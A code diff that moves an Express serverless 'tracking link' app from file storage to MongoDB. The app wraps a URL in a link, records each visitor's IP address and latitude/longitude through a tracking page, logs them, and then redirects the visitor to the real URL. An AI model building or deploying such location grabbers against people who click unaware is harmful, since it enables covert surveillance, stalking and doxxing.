@@ -1,87 +1,80 @@
 const express = require('express');
 const { v4: uuidv4 } = require('uuid');
-const fs = require('fs');
-const path = require('path');
+const { MongoClient, ObjectId } = require('mongodb');
 
 const app = express();
 
-const dataFilePath = path.join(__dirname, '..', 'data.json');
+app.use(express.json());
 
-function readData() {
-  try {
-    const data = fs.readFileSync(dataFilePath, 'utf-8');
-    return JSON.parse(data);
-  } catch (err) {
-    return { trackingLinks: {}, trackingData: {} };
+const uri = process.env.MONGODB_URI;
+const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });
+
+let db;
+let linksCollection;
+let dataCollection;
+
+async function connectDB() {
+  if (!db) {
+    await client.connect();
+    db = client.db(process.env.MONGODB_DB || 'trackingdb');
+    linksCollection = db.collection('trackingLinks');
+    dataCollection = db.collection('trackingData');
   }
 }
 
-function writeData(data) {
-  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
-}
-
-app.use(express.json());
-
-// Endpoint to create a tracking link
-app.post('/create-link', (req, res) => {
+app.post('/create-link', async (req, res) => {
   const { url } = req.body;
   if (!url) {
     return res.status(400).json({ error: 'URL is required' });
   }
-  const data = readData();
+  await connectDB();
   const id = uuidv4();
-  data.trackingLinks[id] = url;
-  writeData(data);
-
-  // Construct base URL for Vercel environment
+  await linksCollection.insertOne({ _id: id, url });
   const baseUrl = req.headers['x-forwarded-proto'] + '://' + req.headers['x-forwarded-host'];
-
   res.json({ trackingUrl: `${baseUrl}/track/${id}` });
 });
 
-// Serve tracking page
-app.get('/track/:id', (req, res) => {
+app.get('/track/:id', async (req, res) => {
   const id = req.params.id;
-  const data = readData();
-  if (!data.trackingLinks[id]) {
+  await connectDB();
+  const link = await linksCollection.findOne({ _id: id });
+  if (!link) {
     return res.status(404).send('Tracking link not found');
   }
   res.sendFile('track.html', { root: './public' });
 });
 
-// Receive tracking data (location and IP)
-app.post('/track/:id/data', (req, res) => {
+app.post('/track/:id/data', async (req, res) => {
   const id = req.params.id;
-  const data = readData();
-  if (!data.trackingLinks[id]) {
+  await connectDB();
+  const link = await linksCollection.findOne({ _id: id });
+  if (!link) {
     return res.status(404).json({ error: 'Tracking link not found' });
   }
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const { latitude, longitude } = req.body;
-  data.trackingData[id] = {
+  await dataCollection.insertOne({
+    linkId: id,
     ip,
     latitude,
     longitude,
-    timestamp: new Date().toISOString(),
-  };
-  writeData(data);
-  console.log('Tracking data received:', data.trackingData[id]);
+    timestamp: new Date(),
+  });
+  console.log('Tracking data received:', { linkId: id, ip, latitude, longitude });
   res.json({ message: 'Data received' });
 });
 
-// Redirect to original URL after tracking
-app.get('/redirect/:id', (req, res) => {
+app.get('/redirect/:id', async (req, res) => {
   const id = req.params.id;
-  const data = readData();
-  const url = data.trackingLinks[id];
-  if (!url) {
+  await connectDB();
+  const link = await linksCollection.findOne({ _id: id });
+  if (!link) {
     return res.status(404).send('Tracking link not found');
   }
-  res.redirect(url);
+  res.redirect(link.url);
 });
 
 module.exports = app;
 
-// Vercel serverless handler
 const serverless = require('serverless-http');
 module.exports.handler = serverless(app);
